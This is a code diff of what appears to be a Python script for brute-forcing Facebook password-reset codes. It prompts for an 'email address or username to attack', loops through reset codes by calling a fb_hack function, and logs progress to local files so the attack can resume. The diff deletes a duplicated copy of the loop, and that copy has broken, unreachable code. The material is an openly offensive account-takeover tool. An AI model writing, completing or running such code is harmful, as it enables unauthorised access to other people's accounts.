@@ -242,37 +242,6 @@ def fb_hack(email, codex):
 
 os.system('clear')
 ehack = input('Email address or username to attack:')
-reset = int(input('Code: ') or 99999999)
-reset1 = reset
-f = open("emails.txt", "a")
-z = open("passcoder.txt", "a")
-f.write(ehack)
-f.close()
-z.write(str(reset1))
-z.close()
-
-while True:
-  try:
-    fb_hack(ehack, reset)
-    reset = reset1
-    if int(reset1) < int(0):
-      break
-    else:
-      reset = reset1
-  except:
-    sys.exit()
-    with open(emails.txt, "r") as f:
-      ehack = f.readlines(-1)
-      f.close()
-    with open(passcoder.txt, "r") as f:
-      reset = int(z.readlines(-1))
-      z.close()
-    print("Restarting")
-    sleepy(30)
-    fb_hack(ehack, reset)
-
-os.system('clear')
-ehack = input('Email address or username to attack:')
 reset = int(input('Code: ') or int(99999999))
 reset1 = reset
 f = open("emails.txt", "a")
